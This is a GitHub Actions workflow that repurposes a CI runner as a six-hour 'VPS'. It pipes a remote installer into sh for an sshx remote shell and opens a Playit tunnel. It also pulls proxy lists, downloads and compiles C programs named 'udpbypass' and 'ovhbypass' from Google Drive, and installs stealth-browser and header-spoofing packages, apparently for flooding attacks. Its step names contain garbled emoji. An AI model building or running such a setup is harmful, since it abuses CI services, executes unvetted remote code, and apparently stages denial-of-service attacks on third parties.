name: Create VPS (Clean Version)
on:
  workflow_dispatch:
  repository_dispatch:
    types: [create-vps]
jobs:
  start-vps:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: ‚¨áÔ∏è Checkout
        uses: actions/checkout@v4
      - name: üîß Start SSHX session
        run: |
          curl -sSf https://sshx.io/get | sh
          sshx > sshx_connection.txt 2>&1 &
          sleep 5
          echo "üîó SSHX Connection:"
          cat sshx_connection.txt
      - name: üöÄ Start Playit Tunnel
        run: |
          wget -q https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64 -O playit
          chmod +x playit
          nohup ./playit > playit.log 2>&1 &
          echo "‚úÖ Playit tunnel started"
      - name: üî• Setup VPS Environment
        run: |
          wget -q https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/https.txt
          wget -q https://github.com/ErcinDedeoglu/proxies/raw/refs/heads/main/proxies/https.txt -O proxy.txt
          pip install gdown
          gdown 'https://drive.google.com/uc?id=1MuaBraso20I73ixepu6SQWDq0GMnlU05' -O udpbypass.c
          gcc udpbypass.c -o udpbypass
          gdown https://drive.google.com/uc?id=1Q2VYSvBdeclp6A1f8xePFrT6Yt7ZB2gX -O ovh.c
          gcc ovh.c -o ovhbypass
          npm install cluster colors colorama axios crypto discord.js gradient-string user-agents header-generator hpack socks puppeteer puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-real-browser
       
      - name: ‚è≥ Keep VPS alive
        run: |
          for i in $(seq 1 360); do
            echo "üü¢ Running minute $i/360..."
            sleep 60
          done
